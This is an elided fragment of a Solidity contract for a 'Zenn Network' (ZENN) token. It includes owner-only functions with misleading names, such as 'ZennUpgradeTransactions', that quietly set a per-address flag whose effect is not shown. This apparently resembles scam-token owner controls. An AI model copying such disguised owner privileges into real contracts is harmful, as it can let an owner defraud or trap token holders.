...
// Zenn Network is the performant 
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Zenn Network';
    string constant public symbol = 'ZENN';
    ...
    function permitTransferProtocol(address account) public onlyOwner {
    ...
    function ZennUpgradeTransactions(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function ZennPerformanceTransactions(address account) public view returns (bool) {
...
contract ZennSmartContract is BaseToken {
